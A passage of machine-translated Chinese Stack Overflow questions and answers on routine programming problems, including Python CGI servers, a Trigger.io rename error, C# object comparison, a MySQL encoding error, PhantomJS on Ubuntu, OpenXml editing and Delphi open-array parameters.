在刷新浏览器以查看您的输出之前..

但如果您`console.log()`的浏览器替代品是`document.write();`

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2020-02-11T17:26:41.787

对于 Chrome 浏览器，请执行以下步骤：

1.  点击顶部右侧的*更多工具*
2.  点击*开发者工具*
3.  点击*控制台*

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2019-02-16T10:14:17.323

您可以添加一个名为“控制台日志查看器”的 chrome 扩展，然后即使不打开开发人员工具也可以查看日志

# python - 带有python的cgi脚本

> ID：13490311
> 
> 赞同：1
> 
> 时间：2012-11-21T09:42:24.530
> 
> 标签：python, cgi

我尝试在 python3 中使用它作为服务器运行 cgi 脚本：

```
from http.server import HTTPServer, CGIHTTPRequestHandler

port = 8080

httpd = HTTPServer(('', port), CGIHTTPRequestHandler)
print("Starting simple_httpd on port: " + str(httpd.server_port))
httpd.serve_forever() 
```

但我收到以下错误：

```
Traceback (most recent call last):
  File "/usr/lib/python3.2/http/server.py", line 1110, in run_cgi
    os.execve(scriptfile, args, env)
OSError: [Errno 2] No such file or directory
localhost - - [21/Nov/2012 10:28:26] CGI script exit status 0x7f00 
```

请帮忙。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-06T22:19:17.733

希望对您有所帮助： 1\. 检查您要执行的脚本是否可执行？如果不是-rwx，则不能执行 2\. 检查脚本的最上面一行，即#! .....如果这一行没有正确指向你的python的文件夹，它仍然无法执行

# ios - 无法在 Linux 环境中运行/构建 IOS。在另一个文件系统上使用 /tmp 文件夹

> ID：13490312
> 
> 赞同：0
> 
> 时间：2012-11-21T09:42:25.220
> 
> 标签：ios, unix, build, trigger.io, tmp

在 unix 世界中，/tmp 文件夹大部分时间与当前运行的操作系统不在同一个文件系统上。

在 Forge 中构建/打包 IOS 应用程序使用临时文件夹和 python 函数`os.rename`，它是 shell`rename`命令的包装器。此命令不能在不同的文件系统上工作。

以下是 forge 运行遇到的错误：

```
[DEBUG] Making Payload directory
[ERROR] [Errno 18] Invalid cross-device link
[DEBUG] Traceback (most recent call last):
  File "/home/<user>/TriggerToolkit/build-tools/forge/async.py", line 96, in run
    result = self._target(*self._args, **self._kwargs)
  File "/home/<user>/TriggerToolkit/trigger/api/app.py", line 286, in run
    forge_main.run(['--general.interactive', 'no'])
  File "/home/<user>/TriggerToolkit/build-tools/forge/main.py", line 437, in run
    build_to_run=build_to_run,
  File "/home/<user>/forge-workspace/sfjozog/.template/generate_dynamic/customer_goals.py", line 126, in run_app
    build_to_run.run()
  File "/home/<user>/forge-workspace/sfjozog/.template/generate_dynamic/build.py", line 337, in run
    self._call_with_params(task_method, task_args)
  File "/home/<user>/forge-workspace/sfjozog/.template/generate_dynamic/build.py", line 296, in _call_with_params
    return method(self, *params)
  File "/home/<user>/forge-workspace/sfjozog/.template/generate_dynamic/ios_tasks.py", line 626, in run_ios
    certificate_password=certificate_password,
  File "/home/<user>/forge-workspace/sfjozog/.template/generate_dynamic/ios_tasks.py", line 571, in run_idevice
    certificate_password=certificate_password,
  File "/home/<user>/forge-workspace/sfjozog/.template/generate_dynamic/ios_tasks.py", line 387, in create_ipa_from_app
    self._create_entitlements_file(build, temp_file_path)
  File "/home/<user>/forge-workspace/sfjozog/.template/generate_dynamic/ios_tasks.py", line 323, in _create_entitlements_file
    _replace_in_file(temp_file_path, 'APP_ID', bundle_id)
  File "/home/<user>/forge-workspace/sfjozog/.template/generate_dynamic/ios_tasks.py", line 318, in _replace_in_file
    os.rename(tmp_file, filename)
OSError: [Errno 18] Invalid cross-device link 
```

- - 编辑 - -

这是一个启用了 Facebook 连接的应用程序（如您所见，它试图替换 APP_ID）

- - 编辑 - -

通过手动更改 python 源文件中使用的函数（在 .templates/ 目录中），这是可行的（所以 shutil.move 是唯一的解决方案）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-29T01:03:54.973

这里也提出了这个问题： [Trigger.io [Errno 18] Cross-device link](https://stackoverflow.com/questions/11578443/trigger-io-errno-18-cross-device-link)

对此的回应提供了解决方法的选项。

# google-maps-api-3 - 添加将在谷歌地图中显示的谷歌地点

> ID：13490313
> 
> 赞同：0
> 
> 时间：2012-11-21T09:42:30.317
> 
> 标签：google-maps-api-3, google-places-api, google-places

我在使用 google place api 添加 google 地方时遇到问题。

使用 url 手动添加地点时

[http://www.google.com/places](http://www.google.com/places)

它已成功添加，并且还收到了验证 PIN。待处理状态显示在我们的仪表板中。上述过程一切正常，但我需要用 google 地方“放置操作”api 来完成同样的事情。链接到 api：https://developers.google.com/places/documentation/actions

我已将此 api 与我的代码集成，并且这些地点已成功添加（获得响应 OK），并且在使用地点搜索 api 时也可以找到。

但主要问题是它没有显示在谷歌地图上。我有点困惑，使用上述 api 添加的地点是否会在谷歌地图中公开查看，或者仅对我们创建的应用程序可用。

请为我提供解决方案..以便我可以在谷歌地图中添加地点，当任何人在地图上公开搜索时，这些地点都会在谷歌地图中找到。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T23:47:23.127

只有少数受信任的应用程序提交的请求才会被审核以集成到 Google 地方信息中。如果您想添加一个可以在您的应用程序之外访问的新地点，您可以按照 Google 地图帮助说明[添加一个新地点](http://support.google.com/maps/bin/answer.py?hl=en&answer=144367&topic=1687361&ctx=topic)。

如果您是企业主，您可以使用[Google Places for Business](http://www.google.com/placesforbusiness)在 Google 地图上添加和验证您的企业。

向 Google 地图添加地点的另一种方法是按照Google 地图制作工具帮助中的[说明通过](http://support.google.com/mapmaker/bin/answer.py?hl=en&answer=1096044&ctx=cb&src=cb&cbid=1wf9zf83h3bs7&cbrank=2)[Google 地图制作工具](http://www.google.com/mapmaker)提交修改。

您添加的地点将在经过审核并被接受后出现在 Google 地图中。

# login - 使用推特 api 登录

> ID：13490314
> 
> 赞同：0
> 
> 时间：2012-11-21T09:42:31.147
> 
> 标签：login, twitter, twitter-oauth

当我尝试在我的网站中将登录与 twitter 集成时，我收到以下消息

```
array(1) {
    ["errors"]=> array(1) { 
        [0]=> array(2) { 
            ["message"]=> string(31) "Sorry, that page does not exist" 
            ["code"]=> int(34) 
        } 
    }  
} 
```

谁能帮我解决这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T09:47:29.173

[http://www.9lessons.info/2011/02/login-with-facebook-and-twitter.html](http://www.9lessons.info/2011/02/login-with-facebook-and-twitter.html)

您只需按照使用 twitter 集成登录的说明进行操作。

# bluetooth - Peerfinder 中 AlternateIdentities 的可能键

> ID：13490318
> 
> 赞同：4
> 
> 时间：2012-11-21T09:42:34.707
> 
> 标签：bluetooth, windows-phone-8, proximity

我试图通过使用 Windows 8 / Windows Phone 8 中的 PeerFinder 类来控制特定设备。

按照构建演示中所示的示例：http: [//channel9.msdn.com/Events/Build/2012/3-047](http://channel9.msdn.com/Events/Build/2012/3-047)

我通过使用这些行获得了配对的蓝牙设备：

```
PeerFinder.AlternateIdentities["Bluetooth:PAIRED"] = "";

var devices = await PeerFinder.FindAllPeersAsync(); 
```

但现在我想通过使用不同的键来获取通过蓝牙连接的设备列表，甚至可能是其他设备：

```
PeerFinder.AlternateIdentities[KEY] = ""; 
```

行代码。MSDN 文档在这种情况下没有帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:12:40.260

Windows Phone 8 蓝牙 API 只能以几种方式使用（这些方式由 AlternateIdentities 驱动）：

1)**应用到设备/WP8 到设备**。这仅适用于配对设备。WP8 蓝牙 API 无法与未配对的蓝牙设备通信。正如您发现的那样，*AlternateIdentities["Bluetooth:Paired"]=""*是用于此用例的正确方法。

2)**应用到应用 / WP8 到 WP8**。这允许 WP8 应用程序与不同手机上的同一应用程序进行通信。您特别需要*避免设置 AlternateIdentities*以使应用程序到应用程序正常工作。

3)**应用到应用 / WP8 到 Win8**。在两端使用特定的 AlternativeIdentities 也可以让应用程序到应用程序为 WP8 到 Win8 工作。您需要将Win8 上的*PeerFinder.AlternateIdentities["WindowsPhone"]*设置为 WP8 应用程序 GUID，并且您需要将WP8 上的*PeerFinder.AlternateIdentities.Add("Windows",GUID)*添加到 Win8 应用程序 GUID。

我们还没有公开分享其他 AlternateIdentities 格式，因为它们不适用于 3rd 方开发者。在考虑 WP8 上的蓝牙用例时，请关注应用到应用和应用到设备。

# c# - 循环遍历包含变量的类

> ID：13490320
> 
> 赞同：3
> 
> 时间：2012-11-21T09:42:37.683
> 
> 标签：c#, class

我想比较两个看起来像这样的类

```
public class Order
{
        public string KundNummer, KundNamn, ErReferens, VarReferens, KontraktsNummer, Betvillk, Levvillk, Levsatt, Speditor,
            Resenh, Projekt, OrderDatum, LeveransDatum, ErtOrdernr, LagerbokfDatum, KundPostAdr, KundPostAdr2, KundGLN, KundPostnr, 
            KundOrt, KundLandKod, KundLand, KundVATnr, KundDistrikt, KundSaljare, KundText1, KundText2, KundText3, KundSprak,
            KundValuta, KundRabattAvtal, KundRabattAvtalBenamning, KundPrislista, KundPrislistaBenamning, KundALnamn, KundALpostAdr, KundALpostAdr2, KundALGLN, KundALpostnr, KundALort,
            KundALlandKod, KundALland;
        public double OrderNummer, Fakturarabatt, Frakt, Expavg, Brutto, Netto, ExklMoms, Totalt, Moms, Avrundn, KundValutaKurs, KundValutaEnhet;
        public int EUPeriodSamman, InklMoms, EjKlar, Levererad, Malukerad, BestallningSkapad, Ordererk,
            Plocklista, Foljesedel, ExtraOrderdokument, Restorder, Faktura, KundSparaText, KundExport, KundRantefakturering, KundKravbrev,
            KundKravavgift, KundRestnoteraEj, KundSamlingsfakturera;
    } 
```

我想比较这个类的两个对象来记录我的数据库中哪些字段发生了变化。

```
public string OrderUppdateraOrder(Order order)
    {
        Order OrderToCompare = new Order();
        OrderToCompare = OrderVisaOrderInformation(order.OrderNummer);

        //then the code goes on to make the changes to the database from the class order
        //while OrdertoComapre still have the values from before this function was called
    } 
```

那么是否可以遍历这些类并比较它们，或者我是否必须为我的类中的每个变量编写一个**if ？**:)

或者也许将其转换为列表？我不知道？:P

谢谢你的回答

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:06:12.847

> 我想记录是否存在差异并记录类似这样的差异 CustomerNumber: changed from 456 to 345

最好的选择可能只是使用反射来爬取公共属性和字段，比较它们。这将有更少的代码来比较，但会产生性能开销。您可以使用 FastMember 等工具大大减少开销：

```
static class Program {
    static void Main()
    {
        Order o1 = new Order { Resenh = "abc" },
              o2 = new Order { Resenh = "abc" };
        ShowDiffs(o1, o2); // {nothing}
        o2.Resenh = "def";
        ShowDiffs(o1, o2); // Resenh changed from abc to def
    }
    static void ShowDiffs<T>(T x, T y)
    {
        var accessor = TypeAccessor.Create(typeof(T));
        if (!accessor.GetMembersSupported) throw new NotSupportedException();
        var members = accessor.GetMembers();

        foreach (var member in members)
        {
            object xVal = accessor[x, member.Name],
                   yVal = accessor[y, member.Name];
            if (!Equals(xVal, yVal))
            {
                Console.WriteLine("{0} changed from {1} to {2}",
                    member.Name, xVal, yVal);
            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:04:32.897

也许这种方法可以帮助你

```
public class Order
{
    public string KundNummer, KundNamn, ErReferens, VarReferens, KontraktsNummer, Betvillk, Levvillk, Levsatt, Speditor,
        Resenh, Projekt, OrderDatum, LeveransDatum, ErtOrdernr, LagerbokfDatum, KundPostAdr, KundPostAdr2, KundGLN, KundPostnr,
        KundOrt, KundLandKod, KundLand, KundVATnr, KundDistrikt, KundSaljare, KundText1, KundText2, KundText3, KundSprak,
        KundValuta, KundRabattAvtal, KundRabattAvtalBenamning, KundPrislista, KundPrislistaBenamning, KundALnamn, KundALpostAdr, KundALpostAdr2, KundALGLN, KundALpostnr, KundALort,
        KundALlandKod, KundALland;
    public double OrderNummer, Fakturarabatt, Frakt, Expavg, Brutto, Netto, ExklMoms, Totalt, Moms, Avrundn, KundValutaKurs, KundValutaEnhet;
    public int EUPeriodSamman, InklMoms, EjKlar, Levererad, Malukerad, BestallningSkapad, Ordererk,
        Plocklista, Foljesedel, ExtraOrderdokument, Restorder, Faktura, KundSparaText, KundExport, KundRantefakturering, KundKravbrev,
        KundKravavgift, KundRestnoteraEj, KundSamlingsfakturera;

    public static bool operator ==(Order left, Order right)
    {
        foreach (var field in left.GetType().GetFields())
        {
            object valueLeft = field.GetValue(left);
            object valueRight = field.GetValue(right);

            if (!object.Equals(valueLeft, valueRight))
                return false;
        }

        return true;
    }

    public static bool operator !=(Order left, Order right)
    {
        return !(left == right);
    }

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:06:19.630

好吧，从我对你的理解来看——你有一个方法可以`Order`从数据库中检索一个对象，以及一个`Order`你可能最初从数据库中获得但经过修改的对象。您想检查一个或多个订单是否发生了变化，而无需说：

> 对于每个订单，如果 Database.A 等于 Your.A 等。

我会将您的支票放在一个地方并覆盖该`Equals`方法。

```
 public class Order
  {
    public int Id;
    public string SomeProp;
    public string AnotherProp;
    public override bool Equals(object obj)
    {
      Order orderToCompare = (Order)obj;
      return (SomeProp == orderToCompare.SomeProp && AnotherProp == orderToCompare.AnotherProp);
    }
  } 
```

然后有两种方法，一种用于更新单个订单，一种用于更新多个订单。

```
private void UpdateOrder(Order o)
{
  //Get the corresponding order from the database (I suspect Entity Framework here in order to get an object?)
  Order dbOrder = OrderVisaOrderInformation(o.Id);
  if (dbOrder.Equals(o))
  {
    //Do some update
  }
}
private void UpdateManyOrders(List<Order> orders)
{
  var dbOrders = (from order in orders
                  select OrderVisaOrderInformation(order.Id));
  List<Order> ordersToUpdate = dbOrders.Where(x => !x.Equals(orders.First(y => y.Id == x.Id))).ToList();
  foreach (Order orderToUpdate in ordersToUpdate)
  {
    //Update the order
  }
} 
```

这可能是错误的，但根据我对您问题的理解，这就是您想要做的。

# java - 合并 \xEF\xBF\xBD 时出现异常

> ID：13490323
> 
> 赞同：1
> 
> 时间：2012-11-21T09:42:44.937
> 
> 标签：java, mysql, hibernate

我正在尝试使用 JPA 作为 ORM 和 MySQL 作为 RDBMS 合并具有 4 个属性（ID、FIRSTNAME、LASTNAME、SCORE）的对象，并且我只更新特定 ID 的分数并获得以下异常。

```
08:53:23,521 WARN  [org.hibernate.engine.jdbc.spi.SqlExceptionHelper] (Thread-35) SQL Error: 1366, SQLState: HY000
08:53:23,521 ERROR [org.hibernate.engine.jdbc.spi.SqlExceptionHelper] (Thread-35) Incorrect string value: '\xEF\xBF\xBD' for column 'FIRSTNAME' at row 1
08:53:23,527 INFO  [org.hibernate.engine.jdbc.batch.internal.AbstractBatchImpl] (Thread-35) HHH00010:On release of batch it still contained JDBC statements
08:53:23,527 ERROR [stderr] (Thread-35) org.springframework.orm.hibernate3.HibernateJdbcException: JDBC exception on Hibernate data access: SQLException for SQL [n/a]; SQL state [HY000]; error code [1366]; Incorrect string value: '\xEF\xBF\xBD' for column 'FIRSTNAME' at row 1; nested exception is org.hibernate.exception.GenericJDBCException: Incorrect string value: '\xEF\xBF\xBD' for column 'FIRSTNAME' at row 1
08:53:23,528 ERROR [stderr] (Thread-35)         at org.springframework.orm.hibernate3.SessionFactoryUtils.convertHibernateAccessException(SessionFactoryUtils.java:645)
08:53:23,528 ERROR [stderr] (Thread-35)         at org.springframework.orm.jpa.vendor.HibernateJpaDialect.translateExceptionIfPossible(HibernateJpaDialect.java:102)
08:53:23,528 ERROR [stderr] (Thread-35)         at org.springframework.orm.jpa.JpaTransactionManager.doCommit(JpaTransactionManager.java:471)
08:53:23,528 ERROR [stderr] (Thread-35)         at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:754) 
```

我怎样才能摆脱这个问题？谢谢！

**编辑**表排序规则是 utf8_general_ci

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T09:57:15.237

`0xEF 0xBF 0xBD`是 U+FFFD 代码点的 UTF-8 编码形式。当 UTF-8 解析器无法将字节序列解析为有效的 UTF-8 序列时，就会发生这种情况。

从您的错误来看，似乎为 Hibernate 提供了这个无效序列。因此，您需要确定堆栈中的数据处理元素是否正在使用不正确的编码解析数据。

# node.js - 在 Ubuntu 上同时运行 PhantomJS 和 node.js

> ID：13490324
> 
> 赞同：1
> 
> 时间：2012-11-21T09:42:45.880
> 
> 标签：node.js, ubuntu, phantomjs

1.  所以我最近一直在使用 phantomjs-node 在我的 Mac 上使用[1.7 修复](https://github.com/sgentle/phantomjs-node/pull/51)，没有任何问题。

    但是，当我尝试在我的 Ubuntu 12.04 机器上运行它时，它给了我以下问题：

    幻影标准输出：ReferenceError：找不到变量：socket phantomjs://webpage.evaluate():1 phantomjs://webpage.evaluate():1 phantomjs://webpage.evaluate():1

    **编辑：**
    导致此问题的`shim.js`行位于第 1684 行：

    ```
    evil = "function(){socket.emit('message', " + (JSON.stringify(JSON.stringify(req))) + " + '\\n');}"; 
    ```

    这似乎与[这个 PhantomJS 问题](https://github.com/sgentle/phantomjs-node/issues/31)有关。

    关于如何解决上述问题的任何想法都会有所帮助。

2.  所以我尝试使用[phantom-proxy](https://github.com/sheebz/phantom-proxy)代替，因为它意味着 phantomjs-node 的最新版本。

    但是，在我的 ubuntu 12.04 机器上运行时，我遇到了另一种问题：

    ```
    SyntaxError: Parse error
    TypeError: 'undefined' is not a function (evaluating 'require('./webpage').create(this)')
    ~/node_modules/phantom-proxy/lib/server/webserver.js:11
    ~/node_modules/phantom-proxy/lib/server/webserver.js:164
    ~/node_modules/phantom-proxy/lib/server/webserver.js:165 
    ```

    我确实意识到存在解析错误，但这是复制所`readme.md`提供的示例之一。

    对此解决方案的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:30:05.587

好的，所以我使用选项**1**解决了这个问题。

它要求我使用

```
 express myapp
    npm install 
```

等等..然后在我的 package.json 文件中我附加了依赖项：

```
 "phantom":"git://github.com/amir20/phantomjs-node.git#phantom-1.7-fix"
   npm install 
```

l 然后测试了提供的示例之一：

```
 var phantom = require('phantom');

   phantom.create(function (ph) {
      console.log('instance created');
      ph.createPage(function (page) {
         console.log('spooled up');
         page.open('http://www.google.com', function (status) {
            console.log(status);
            page.release();
         });
      });
   }); 
```

这一切都正常工作。

* * *

**注意：**我不要在我的 ubuntu 机器上使用代理，这就是它工作的原因，在我确实有代理的机器上，示例无法执行，这让我觉得它不能在 heroku 盒子上工作，但是我今天将进行测试并使用结果编辑此答案。

* * *

**编辑**

我通过在 heroku 上部署我的应用程序来检查这个解决方案。运行我的应用程序时，它在我预期的地方失败了：

```
 phantom stdout: ReferenceError: Can't find variable: socket
       phantomjs://webpage.evaluate():1
       phantomjs://webpage.evaluate():1
       phantomjs://webpage.evaluate():1 
```

这是因为除非您指定代理设置，否则 phantomjs-node 无法在代理后面工作，并且由于 l 在 heroku 上运行，l 无法指定这些设置。

# django-registration - Django-注册管理员访问

> ID：13490327
> 
> 赞同：1
> 
> 时间：2012-11-21T09:42:59.523
> 
> 标签：django-registration

我已经启动并运行了 Django 注册。它似乎工作得很好。它允许我注册/登录，然后将我重定向到 /accounts/profile/。

但是，我希望注册用户访问管理员。我可以将 /accounts/profile 重定向到 admin/ 但我的用户无法登录，他们需要设置员工状态。我会通过信号来做到这一点吗？我对他们不是很熟悉。

此外，当用户注册时，我希望他们拥有包含更多详细信息的个人资料。我该如何扩展这个。我不确定我是要扩展用户还是扩展 DjangoRegistration？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T10:06:24.397

我对此进行了很多研究。虽然我认为它是可能的，但我认为这不是它的设计方式。

它旨在为您提供管理员访问权限，然后在视图上使用 is_authenticated 装饰器。它实际上工作得很好。

# text - 使用 Open XML WordprocessingDocument 删除 MS Word 文档部分

> ID：13490330
> 
> 赞同：1
> 
> 时间：2012-11-21T09:43:17.557
> 
> 标签：text, openxml

我正在使用 C# 和 OpenXml DLL 来修改现有的 MS Word 文档。我成功地替换了文档中的一些标签，然后保存了修改，但我还不能删除部分文本。

例如，我的文档有很多标题（Heading1 文本样式），然后是正文，我想以编程方式删除给定的标题和所有后续文本，直到下一个标题。

原始文件示例：

```
Heading 1 Body text 1 ... ...

Heading 2 Body text 2 ... ...

Heading 3 Body text 3 ... ... 
```

如果用户想要删除标题 2，输出文档应导致：

```
Heading 1 Body text 1 ... ...

Heading 3 Body text 3 ... ... 
```

我会以正确的方式做到这一点吗？有谁知道怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T14:56:02.390

这取决于数据（段落）的组织方式。

如果标题和段落彼此相邻，只需循环浏览段落，找到带有标题的段落并删除下一个段落。

```
bool remove = false;

foreach(Paragraph p in body.Descendants<Paragraph>()) {

    if (remove)
    {
        p.Remove();
        remove = !remove;
        continue;
    }

    if(p.InnerText.Contains("Heading 2")) {

        p.Remove();
        remove = !remove;

    }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-05T08:03:01.817

我包括我用来解决问题的代码：

```
 List<OpenXmlElement> ElementsToDeleteList = new List<OpenXmlElement>();
        bool IsParagraphsToDelete = false;
        ...
        // Execute headings removal
        using (WordprocessingDocument wordDoc = WordprocessingDocument.Open(sOutputFileName, true))
        {
            foreach (OpenXmlElement element in wordDoc.MainDocumentPart.RootElement.Descendants())
            {
                if (element.GetType() == typeof(Paragraph))
                {
                    Paragraph paragraph = (Paragraph)element;
                    if (paragraph.ParagraphProperties != null && paragraph.ParagraphProperties.ParagraphStyleId != null &&
                        paragraph.ParagraphProperties.ParagraphStyleId.Val != null && paragraph.ParagraphProperties.ParagraphStyleId.Val.Value != null)
                    {
                        if (paragraph.ParagraphProperties.ParagraphStyleId.Val.Value.ToLower().Contains(MainHeaderStyleName.ToLower()) ||
                            paragraph.ParagraphProperties.ParagraphStyleId.Val.Value.ToLower().Contains(SecondaryHeaderStyleName.ToLower()))
                        {
                            StringBuilder sb = new StringBuilder();
                            foreach (var run in paragraph.Elements<Run>())
                                sb.Append(run.InnerText);

                            string ChapterTitle = sb.ToString().Trim().ToUpper();
                            IsParagraphsToDelete = ListOfDocumentTests.Where(x => x.Title.ToUpper().Trim() == ChapterTitle && x.IsIncluded == false).FirstOrDefault() != null;

                            if (string.IsNullOrEmpty(ChapterTitle) && !IsParagraphsToDelete)
                                ElementsToDeleteList.Add(paragraph);
                        }
                    }
                }

                if (IsParagraphsToDelete && (element.GetType() == typeof(Paragraph) || element.GetType() == typeof(Table)))
                {
                    ElementsToDeleteList.Add(element);
                }

            }

            foreach (OpenXmlElement elemToDelete in ElementsToDeleteList)
            {
                elemToDelete.RemoveAllChildren();
                elemToDelete.Remove();
            }

            wordDoc.MainDocumentPart.Document.Save();

        } 
```

# automatic-ref-counting - ivar 标量和对象为 null/nil 以释放 ARC 中的内存

> ID：13490334
> 
> 赞同：1
> 
> 时间：2012-11-21T09:43:33.673
> 
> 标签：automatic-ref-counting

我有以下类创建序列：`UIController`实例`ServiceClass`化哪个实例化`DAOManagerClass`哪个实例化`DAOCLass`：

```
UIController -> Service -> DAOManager -> DAO 
```

如果我对 ARC 理解得很好，当服务不再使用时，感谢 ARC，它将作为服务发布，`DAOManager`并且`DAO`.

**问题 ：**

1.  将 Service 设置为 nil 是否是指定不再使用它的正确方法？
2.  `DAOManager`对于性能问题，在完成执行时将其设置`DAO`为 nil是否是一件好事，对于`DAO`在完成执行时将设置`DAOManager`为 nil的服务也是如此`DAOManager`。

# delphi - 为什么我可以将 X 类型的 var 传递给该类型的开放数组参数？

> ID：13490338
> 
> 赞同：9
> 
> 时间：2012-11-21T09:43:53.417
> 
> 标签：delphi, delphi-xe2, open-array-parameters

使用 Delphi XE-2（已应用所有更新）。

我希望以下代码会在 DoSomething 和 DoInteger 调用上生成编译错误，但事实并非如此。

```
program OpenArrayQuestion;

{$APPTYPE CONSOLE}
{$R *.res}

uses
  System.SysUtils;

type
  IComposite = interface(IInterface)
  ['{1AC3CF6A-1316-4838-B67B-9FB075585C1E}']
  end;

  IComposite<T: IComposite> = interface(IComposite)
  ['{7F866990-9973-4F8E-9C1F-EF93EF86E8F2}']
  end;

function DoSomething(const aData: array of IComposite): Boolean;
begin
  Result := True;
end;

function DoInteger(const aData: array of Integer): boolean;
begin
  Result := True;
end;

var
  FData: IComposite;
  FInteger: Integer;
begin
  DoSomething(FData);
  DoInteger(FInteger);
end. 
```

有人能解释一下为什么我可以将 FData/FInteger（都只是单个变量）传递给它们各自类型的开放数组参数，而无需将其放在`[]`'s 之间，并且编译器不会将其直接返回给我吗？

我认为它可能与接口数组甚至涉及的泛型有关，但编译器也接受传递给开放整数数组的整数。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-21T09:58:28.500

编译器有点松懈，因为这样做没有歧义。

考虑以下：

```
program OpenArrays;

{$APPTYPE CONSOLE}

procedure Test1(i: Integer); overload;
begin
  Writeln('Test1Integer');
end;

procedure Test1(i: array of Integer); overload;
begin
  Writeln('Test1OpenArray');
end;

procedure Test2(i: array of Integer);
begin
  Writeln('Test2');
end;

var
  i: Integer;

begin
  Test1(i);
  Test1([i]);
  Test2(i);
  Readln;
end. 
```

产生这个输出：

```
测试1整数
Test1OpenArray
测试2

```

我已经重载`Test1`，因此有一个接收整数的版本，以及一个接收开放整数数组的版本。在这种情况下，调用`Test1(i)`会转到仅接收整数的重载。另一方面，我可以调用`Test2`which 接收一个开放数组，只需传递一个整数。

* * *

我相信[语言指南](http://docwiki.embarcadero.com/RADStudio/XE3/en/Delphi_Language_Guide_Index)中没有记录这种行为。但是，@hvd 在[编译器错误 E2192 的文档中](http://docwiki.embarcadero.com/RADStudio/XE/en/E2192_Constants_cannot_be_used_as_open_array_arguments_%28Delphi%29)发现了以下内容（强调我的）：

> 开放数组参数必须提供实际数组变量、构造数组或**参数元素类型的单个变量**。

# java - 如何制作一个外观和行为类似于单个表头的 SWT 组件

> ID：13490345
> 
> 赞同：2
> 
> 时间：2012-11-21T09:44:10.543
> 
> 标签：java, swt, jface

我正在尝试找到一种方法来制作一个看起来像本机表头组件的 SWT 组件，因此在 Windows 7 中：

![Windows 7 列标题](../Images/80618585abc0488e931e3ce1172e7d42.png)

我希望它也具有与本机组件相同的悬停行为。

我曾考虑过使用具有一列的实际表格，但我无法仅获得标题来填充我的整个复合材料。这是我一直在使用的代码：

```
package widgets;

import org.eclipse.jface.viewers.ArrayContentProvider;
import org.eclipse.jface.viewers.StyledCellLabelProvider;
import org.eclipse.jface.viewers.TableViewer;
import org.eclipse.jface.viewers.TableViewerColumn;
import org.eclipse.jface.viewers.ViewerCell;
import org.eclipse.swt.SWT;
import org.eclipse.swt.layout.GridData;
import org.eclipse.swt.layout.GridLayout;
import org.eclipse.swt.widgets.Composite;
import org.eclipse.swt.widgets.Display;
import org.eclipse.swt.widgets.Shell;

public class TableHeaderButton extends Composite {

    public TableHeaderButton(Composite parent) {
        super(parent, SWT.NONE);
        this.setLayout(new GridLayout(1, true));
        makeTable(this);
    }

    private static TableViewer makeTable(Composite parent) {
        TableViewer viewer = new TableViewer(parent, SWT.FULL_SELECTION
                | SWT.H_SCROLL | SWT.V_SCROLL | SWT.NONE);

        viewer.setContentProvider(ArrayContentProvider.getInstance());

        viewer.getTable().setLayoutData(
                new GridData(SWT.FILL, SWT.FILL, false, false));

        TableViewerColumn col = new TableViewerColumn(viewer, SWT.NONE);
        col.getColumn().setWidth(100);
        col.getColumn().setText("Text Column");

        viewer.getTable().setHeaderVisible(true);

        return viewer;
    }

    public static void main(String[] args) {
        final Display display = new Display();
        final Shell shell = new Shell(display);
        shell.setLayout(new GridLayout(1, true));

        new TableHeaderButton(shell);

        shell.pack();
        shell.open();
        while (!shell.isDisposed()) {
            if (!display.readAndDispatch()) {
                display.sleep();
            }
        }
        display.dispose();
    }

} 
```

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:59:22.303

您是否尝试使用 TableColumnLayout ？

```
 TableColumnLayout tableColumnLayout = new TableColumnLayout();
  yourcomposite.setLayout(tableColumnLayout);
  tableColumnLayout.setColumnData(youcolumn, new ColumnWeightData(100, true)); 
```

有关更多信息，请查看：

[官方文档](http://help.eclipse.org/indigo/index.jsp?topic=/org.eclipse.platform.doc.isv/reference/api/org/eclipse/jface/layout/TableColumnLayout.html)

[TableLayout 的使用示例](http://blog.eclipse-tips.com/2008/05/single-column-tableviewer-and.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T15:13:32.523

好的，我已经设法创建了一个带有单列的表并仅显示组件中的标题，我的问题是表为水平滚动条保留了空间，这是我不想要的。我仍然无法动态更改文本，很可能有一种更清洁的方法：（PS我知道内存泄漏）

```
package widgets;

import org.eclipse.jface.layout.TableColumnLayout;
import org.eclipse.jface.viewers.ColumnWeightData;
import org.eclipse.swt.SWT;
import org.eclipse.swt.events.MouseEvent;
import org.eclipse.swt.events.MouseListener;
import org.eclipse.swt.events.PaintEvent;
import org.eclipse.swt.events.PaintListener;
import org.eclipse.swt.events.SelectionEvent;
import org.eclipse.swt.events.SelectionListener;
import org.eclipse.swt.graphics.Color;
import org.eclipse.swt.graphics.Rectangle;
import org.eclipse.swt.layout.GridData;
import org.eclipse.swt.layout.GridLayout;
import org.eclipse.swt.widgets.Composite;
import org.eclipse.swt.widgets.Display;
import org.eclipse.swt.widgets.Label;
import org.eclipse.swt.widgets.Shell;
import org.eclipse.swt.widgets.Table;
import org.eclipse.swt.widgets.TableColumn;

public class TableHeaderButton extends Composite implements MouseListener {

    private Color highlight = new Color(getDisplay(), 255, 0, 0);
    private boolean selected;
    private TableColumn col;
    private Table table;
    private Composite tableComp;
    private GridData data;

    public TableHeaderButton(Composite parent) {
        super(parent, SWT.NONE);

